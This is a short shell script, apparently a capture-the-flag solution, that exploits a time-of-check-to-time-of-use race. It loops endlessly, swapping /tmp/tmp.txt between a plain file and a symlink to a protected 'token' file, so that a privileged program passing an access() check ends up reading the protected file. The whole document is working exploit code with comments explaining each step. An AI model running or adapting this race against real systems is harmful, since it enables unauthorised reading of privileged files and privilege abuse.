#!/bin/sh

while true
do
        rm -rf /tmp/tmp.txt #erase tmp.txt
	echo "yoo" > /tmp/tmp.txt #create an openable file to fake access()
	sleep 0.0001 #wait a little amount of time to create a symlink right after access() (luck needed)
        rm -rf /tmp/tmp.txt #rm again
        ln -s ~/token /tmp/tmp.txt #and then create a symlink to an elevated perms file
	#do it again and again
done
exit 0
